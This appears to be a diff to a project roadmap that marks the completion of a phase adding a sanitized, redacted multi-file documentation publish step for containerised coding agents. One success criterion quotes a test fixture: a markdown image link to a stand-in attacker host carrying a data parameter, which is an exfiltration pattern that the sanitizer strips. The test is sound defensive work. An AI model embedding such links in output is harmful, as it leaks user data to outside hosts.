@@ -49,7 +49,7 @@
 ### v4.0 Agent Documentation Layer (Planning)
 
 - [x] **Phase 23: Profile ↔ Doc Repo Binding** - Profile schema holds doc repo coordinates and host-only PAT; `init-docs` bootstraps per-project directory layout (completed 2026-04-13)
-- [ ] **Phase 24: Multi-File Publish Bundle** - Host-side `publish_docs_bundle` writes standardized reports + INDEX.md as single atomic commit through existing redaction pipeline
+- [x] **Phase 24: Multi-File Publish Bundle** - Host-side `publish_docs_bundle` writes standardized reports + INDEX.md as single atomic commit through existing redaction pipeline (completed 2026-04-14)
 - [ ] **Phase 25: Context Read & Read-Only Bind Mount** - Sparse shallow clone of doc repo bind-mounted read-only at `/agent-docs/` so agents can read project context without push access
 - [ ] **Phase 26: Stop Hook & Mandatory Reporting** - Stop hook verifies local spool (no network); host-side async shipper pushes reports with jittered backoff, never blocking Claude exit
 
@@ -141,9 +141,9 @@
   4. Every staged file is sanitized to strip external image references, raw HTML, and HTML comments before commit, and a test seeding `![](https://attacker.tld/?data=x)` confirms the reference is removed
   5. Push uses `git push` over HTTPS (never `--force`) with 3-attempt jittered retry on non-fast-forward, and a test that races two concurrent publishes produces two commits on `main` with no lost updates
 **Plans**: 3 plans
-  - [ ] 24-01-PLAN.md — Wave 0: tests/test-phase24.sh + fixtures + canonical bundle.md template (RPT-01 file half)
+  - [x] 24-01-PLAN.md — Wave 0: tests/test-phase24.sh + fixtures + canonical bundle.md template (RPT-01 file half)
   - [x] 24-02-PLAN.md — Wave 1: verify_bundle_sections + sanitize_markdown_file helpers (RPT-01, RPT-04)
-  - [ ] 24-03-PLAN.md — Wave 2: publish_docs_bundle main function — composes redact + sanitize + atomic commit + push_with_retry (DOCS-02, DOCS-03, RPT-02, RPT-03, RPT-05)
+  - [x] 24-03-PLAN.md — Wave 2: publish_docs_bundle main function — composes redact + sanitize + atomic commit + push_with_retry (DOCS-02, DOCS-03, RPT-02, RPT-03, RPT-05)
 
 ### Phase 25: Context Read & Read-Only Bind Mount
 **Goal**: Agents can read the doc repo's per-project context at spawn time without having any path to push from inside the container
@@ -200,6 +200,6 @@
 | 21. launchd Service Management | v3.0 | 0/0 | Not started | - |
 | 22. macOS Integration Tests | v3.0 | 0/0 | Not started | - |
 | 23. Profile ↔ Doc Repo Binding | v4.0 | 3/3 | Complete   | 2026-04-13 |
-| 24. Multi-File Publish Bundle | v4.0 | 1/3 | In Progress|  |
+| 24. Multi-File Publish Bundle | v4.0 | 3/3 | Complete   | 2026-04-14 |
 | 25. Context Read & Bind Mount | v4.0 | 0/0 | Not started | - |
 | 26. Stop Hook & Mandatory Reporting | v4.0 | 0/0 | Not started | - |
